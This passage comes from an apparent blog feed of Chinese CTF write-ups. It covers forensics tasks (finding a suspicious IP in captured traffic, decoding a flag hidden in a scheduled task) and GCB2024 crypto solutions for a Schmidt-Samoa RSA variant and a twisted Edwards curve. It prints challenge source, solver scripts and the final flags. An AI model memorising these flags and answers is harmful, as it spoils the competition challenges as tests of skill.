id="winft"><a class="markdownIt-Anchor" href="#winft"></a> WinFT</h4><h5 id="winft-1"><a class="markdownIt-Anchor" href="#winft-1"></a> WinFT-1</h5><p>虚拟机里面自带的火绒剑分析网络，发现可疑程序和ip</p><p><img src="/imgs/CISCNCCB2025/WinFT/1.png" alt="" /></p><p>使用wireshark过滤ip，翻到最后有一个http包，里面有域名</p><p><img src="/imgs/CISCNCCB2025/WinFT/2.png" alt="" /></p><h5 id="winft-2"><a class="markdownIt-Anchor" href="#winft-2"></a> WinFT-2</h5><p>打开计划任务</p><p><img src="/imgs/CISCNCCB2025/WinFT/3.png" alt="" /></p><p>JiM3ODsmIzEwNTsmIzk5OyYjMTAxOyYjNjUyOTI7JiMxMDI7JiMxMDg7JiM5NzsmIzEwMzsmIzMyOyYjMTA1OyYjMTE1OyYjMzI7JiMxMjM7JiM2NTsmIzY5OyYjODM7JiM5NTsmIzEwMTsmIzExMDsmIzk5OyYjMTE0OyYjMTIxOyYjMTEyOyYjMTE2OyYjMTA1OyYjMTExOyYjMTEwOyYjOTU7JiM5NzsmIzEwODsmIzEwMzsmIzExMTsmIzExNDsmIzEwNTsmIzExNjsmIzEwNDsmIzEwOTsmIzk1OyYjMTA1OyYjMTE1OyYjOTU7JiM5NzsmIzExMDsmIzk1OyYjMTAxOyYjMTIwOyYjOTk7JiMxMDE7JiMxMDg7JiMxMDg7JiMxMDE7JiMxMTA7JiMxMTY7JiM5NTsmIzEwMTsmIzExMDsmIzk5OyYjMTE0OyYjMTIxOyYjMTEyOyYjMTE2OyYjMTA1OyYjMTExOyYjMTEwOyYjOTU7JiM5NzsmIzEwODsmIzEwMzsmIzExMTsmIzExNDsmIzEwNTsmIzExNjsmIzEwNDsmIzEwOTsmIzEyNTs=</p><p>78 105 99 101 65292 102 108 97 103 32 105 115 32 123 65 69 83 95 101 110 99 114 121 112 116 105 111 110 95 97 108 103 111 114 105 116 104 109 95 105 115 95 97 110 95 101 120 99 101 108 108 101 110 116 95 101 110 99 114 121 112 116 105 111 110 95 97 108 103 111 114 105 116 104 109 125</p><p>删除65292，十进制转ascii码就行了</p><p>{AES_encryption_algorithm_is_an_excellent_encryption_algorithm}</p><h4 id="sc05"><a class="markdownIt-Anchor" href="#sc05"></a> sc05</h4><h5 id="sc05-1"><a class="markdownIt-Anchor" href="#sc05-1"></a> sc05-1</h5><p>切换到TCP的表搜索134.6.4.12</p><p>找到最近时间2024/11/09_16:22:42</p><p>01DF5BC2388E287D4CC8F11EA4D31929</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Crypto</tag>
      
      <tag>Forensics</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>国城杯2024-Crypto</title>
    <link href="/2024/12/07/GCB2024/"/>
    <url>/2024/12/07/GCB2024/</url>
    
    <content type="html"><![CDATA[<h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> crypto</h1><h2 id="babyrsa"><a class="markdownIt-Anchor" href="#babyrsa"></a> babyRSA</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span>*<br><br>flag = <span class="hljs-string">b&#x27;D0g3xGC&#123;****************&#125;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_key</span>(<span class="hljs-params">p, q</span>):<br>    public_key = p*p*q<br>    e = public_key<br>    n = p*q<br>    phi_n = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>    private_key = inverse(e,phi_n)<br>    <span class="hljs-keyword">return</span> public_key,private_key,e<br><br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br><br>N,d,e = gen_key(p,q)<br><br>c = gmpy2.powmod(bytes_to_long(flag),e,N)<br><br><span class="hljs-built_in">print</span>(N)<br><span class="hljs-built_in">print</span>(d)<br><span class="hljs-built_in">print</span>(c)<br></code></pre></td></tr></table></figure><blockquote><p>参考：<a href="https://blog.csdn.net/MikeCoke/article/details/113915715">blog.csdn.net/MikeCoke/article/details/113915715</a></p></blockquote><p><em>Schmidt-Samoa</em>密码:<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo>=</mo><msup><mi>p</mi><mn>2</mn></msup><mo>∗</mo><mi>q</mi><mo separator="true">,</mo><mi>e</mi><mo>=</mo><mi>N</mi></mrow><annotation encoding="application/x-tex">N=p^2*q,e=N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span></p><p>解密：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>m</mi><mo>=</mo><msup><mi>c</mi><mi>d</mi></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi><mo>∗</mo><mi>q</mi><mspace linebreak="newline"></mspace></mrow><annotation encoding="application/x-tex">m=c^d\mod p*q\\</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8991079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span><span class="mspace newline"></span></span></span></span></p><p>获取p*q：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>e</mi><mo>∗</mo><mi>d</mi><mo>=</mo><mn>1</mn><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>∗</mo><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>N</mi><mo>∗</mo><mi>d</mi><mo>=</mo><mn>1</mn><mo>+</mo><mi>k</mi><mo>∗</mo><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>∗</mo><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mtext>由欧拉定理得：</mtext><msup><mn>2</mn><mrow><mi>N</mi><mo>∗</mo><mi>d</mi></mrow></msup><mo>≡</mo><msup><mn>2</mn><mrow><mn>1</mn><mo>+</mo><mi>k</mi><mo>∗</mo><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>∗</mo><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></msup><mo>≡</mo><mo>=</mo><mn>2</mn><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi><mo>∗</mo><mi>q</mi><mo>=</mo><mn>2</mn><mo>+</mo><mi>k</mi><mo>∗</mo><mi>p</mi><mi>q</mi><mspace linebreak="newline"></mspace><mtext>与</mtext><mi>N</mi><mtext>求</mtext><mi>g</mi><mi>c</mi><mi>d</mi><mtext>即可得到</mtext><mi>p</mi><mo>∗</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">e*d=1\mod (p-1)*(q-1)\\N*d=1+k*(p-1)*(q-1)\\由欧拉定理得：2^{N*d}\equiv2^{1+k*(p-1)*(q-1)}\equiv=2\mod p*q=2+k*pq\\与N求gcd即可得到p*q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8991079999999999em;vertical-align:0em;"></span><span class="mord cjk_fallback">由</span><span class="mord cjk_fallback">欧</span><span class="mord cjk_fallback">拉</span><span class="mord cjk_fallback">定</span><span class="mord cjk_fallback">理</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">：</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span><span class="mbin mtight">∗</span><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.938em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.938em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mbin mtight">+</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">∗</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">p</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">)</span><span class="mbin mtight">∗</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">与</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord cjk_fallback">求</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mord cjk_fallback">即</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">到</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> libnum <span class="hljs-keyword">import</span>*<br>N = <span class="hljs-number">539403894871945779827202174061302970341082455928364137444962844359039924160163196863639732747261316352083923762760392277536591121706270680734175544093484423564223679628430671167864783270170316881238613070741410367403388936640139281272357761773388084534717028640788227350254140821128908338938211038299089224967666902522698905762169859839320277939509727532793553875254243396522340305880944219886874086251872580220405893975158782585205038779055706441633392356197489</span><br>d = <span class="hljs-number">58169755386408729394668831947856757060407423126014928705447058468355548861569452522734305188388017764321018770435192767746145932739423507387500606563617116764196418533748380893094448060562081543927295828007016873588530479985728135015510171217414380395169021607415979109815455365309760152218352878885075237009</span><br>c = <span class="hljs-number">82363935080688828403687816407414245190197520763274791336321809938555352729292372511750720874636733170318783864904860402219217916275532026726988967173244517058861515301795651235356589935260088896862597321759820481288634232602161279508285376396160040216717452399727353343286840178630019331762024227868572613111538565515895048015318352044475799556833174329418774012639769680007774968870455333386419199820213165698948819857171366903857477182306178673924861370469175</span><br><br>pq = gcd(<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,d*N,N)-<span class="hljs-number">2</span>,N)<br><br>m = <span class="hljs-built_in">pow</span>(c,d,pq)<br><span class="hljs-built_in">print</span>(n2s(m))<br><span class="hljs-comment">#b&#x27;D0g3xGC&#123;W1sh_Y0u_Go0d_L@ucK-111&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="curve"><a class="markdownIt-Anchor" href="#curve"></a> Curve</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sagemath</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">P, Q</span>):<br>    (x1, y1) = P<br>    (x2, y2) = Q<br><br>    x3 = (x1*y2 + y1*x2) * inverse(<span class="hljs-number">1</span> + d*x1*x2*y1*y2, p) % p<br>    y3 = (y1*y2 - a*x1*x2) * inverse(<span class="hljs-number">1</span> - d*x1*x2*y1*y2, p) % p<br>    <span class="hljs-keyword">return</span> (x3, y3)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mul</span>(<span class="hljs-params">x, P</span>):<br>    Q = (<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">while</span> x &gt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">if</span> x % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>:<br>            Q = add(Q, P)<br>        P = add(P, P)<br>        x = x &gt;&gt; <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> Q<br><br>p = <span class="hljs-number">64141017538026690847507665744072764126523219720088055136531450296140542176327</span><br>a = <span class="hljs-number">362</span><br>d = <span class="hljs-number">7</span><br>e=<span class="hljs-number">0x10001</span><br><br>gx=bytes_to_long(<span class="hljs-string">b&#x27;D0g3xGC&#123;*****************&#125;&#x27;</span>)<br><br>PR.&lt;y&gt;=PolynomialRing(Zmod(p))<br>f=(d*gx^<span class="hljs-number">2</span>-<span class="hljs-number">1</span>)*y^<span class="hljs-number">2</span>+(<span class="hljs-number">1</span>-a*gx^<span class="hljs-number">2</span>)<br>gy=<span class="hljs-built_in">int</span>(f.roots()[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>])<br><br><span class="hljs-keyword">assert</span> (a*gx^<span class="hljs-number">2</span>+gy^<span class="hljs-number">2</span>)%p==(<span class="hljs-number">1</span>+d*gx^<span class="hljs-number">2</span>*gy^<span class="hljs-number">2</span>)%p<br><br>G=(gx,gy)<br><br>eG = mul(e, G)<br><span class="hljs-built_in">print</span>(eG)<br><br><span class="hljs-comment">#eG = (34120664973166619886120801966861368419497948422807175421202190709822232354059, 11301243831592615312624457443883283529467532390028216735072818875052648928463)</span><br><br></code></pre></td></tr></table></figure><p>直接套鸡块师傅的脚本就行了：<a href="https://tangcuxiaojikuai.xyz/post/187210a7.html">https://tangcuxiaojikuai.xyz/post/187210a7.html</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>p = <span class="hljs-number">64141017538026690847507665744072764126523219720088055136531450296140542176327</span><br>a = <span class="hljs-number">362</span><br>d = <span class="hljs-number">7</span><br>e=<span class="hljs-number">0x10001</span><br>eG = (<span class="hljs-number">34120664973166619886120801966861368419497948422807175421202190709822232354059</span>, <span class="hljs-number">11301243831592615312624457443883283529467532390028216735072818875052648928463</span>)<br>c=<span class="hljs-number">1</span><br><span class="hljs-comment">#part2 map to ECC</span><br>F = GF(p)<br>dd = F(d*c^<span class="hljs-number">4</span>)<br>A = F(<span class="hljs-number">2</span>) * F(a+dd) / F(a-dd)<br>B = F(<span class="hljs-number">4</span>) / F(a-dd)<br>a = F(<span class="hljs-number">3</span>-A^<span class="hljs-number">2</span>) / F(<span class="hljs-number">3</span>*B^<span class="hljs-number">2</span>)<br>b = F(<span class="hljs-number">2</span>*A^<span class="hljs-number">3</span>-<span class="hljs-number">9</span>*A) / F(<span class="hljs-number">27</span>*B^<span class="hljs-number">3</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edwards_to_ECC</span>(<span class="hljs-params">x,y</span>):<br>    x1 = F(x) / F(c)<br>    y1 = F(y) / F(c)<br>    <span class="hljs-comment">#now curve is a*x^2+y^2 = 1+dd*x^2*y^2</span><br><br>    x2 = F(<span class="hljs-number">1</span>+y1) / F(<span class="hljs-number">1</span>-y1)<br>    y2 = F(x2) / F(x1)<br>    <span class="hljs-comment">#now curve is By^2 = x^3 + Ax^2 + x</span><br><br>    x3 = (F(<span class="hljs-number">3</span>*x2) + F(A)) / F(<span class="hljs-number">3</span>*B)<br>    y3 = F(y2) / F(B)<br>    <span class="hljs-comment">#now curve is y^2 = x^3 + ax + b</span><br><br>    <span class="hljs-keyword">return</span> (x3,y3)<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ECC_to_edwards</span>(<span class="hljs-params">x,y</span>):<br>    x2 = (F(x) * F(<span class="hljs-number">3</span>*B) - F(A)) / F(<span class="hljs-number">3</span>)<br>    y2 = F(y) * F(B)<br>    <span class="hljs-comment">#now curve is By^2 = x^3 + Ax^2 + x</span><br><br>    x1 = F(x2) / F(y2)<br>    y1 = F(<span class="hljs-number">1</span>) - (F(<span class="hljs-number">2</span>) / F(x2+<span class="hljs-number">1</span>))<br>    <span class="hljs-comment">#now curve is a*x^2+y^2 = 1+dd*x^2*y^2</span><br><br>    x_ = F(x1) * F(c)<br>    y_ = F(y1) * F(c)<br>    <span class="hljs-comment">#now curve is a*x^2+y^2 = c^2(1+d*x^2*y^2)</span><br>    <br>    <span class="hljs-keyword">return</span> (x_,y_)<br> <br>E = EllipticCurve(GF(p), [a, b])<br>order = E.order()<br>eG = E(edwards_to_ECC(eG[<span class="hljs-number">0</span>],eG[<span class="hljs-number">1</span>]))<br>t = inverse(e,order)<br>G = t*eG<br>G = ECC_to_edwards(G[<span class="hljs-number">0</span>],G[<span class="hljs-number">1</span>])<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(G[<span class="hljs-number">0</span>])))<br><span class="hljs-comment">#b&#x27;D0g3xGC&#123;SOlvE_The_Edcurv3&#125;&#x27;</span><br><br></code></pre></td></tr></table></figure><h2 id="ez_sign"><a class="markdownIt-Anchor" href="#ez_sign"></a> EZ_sign</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 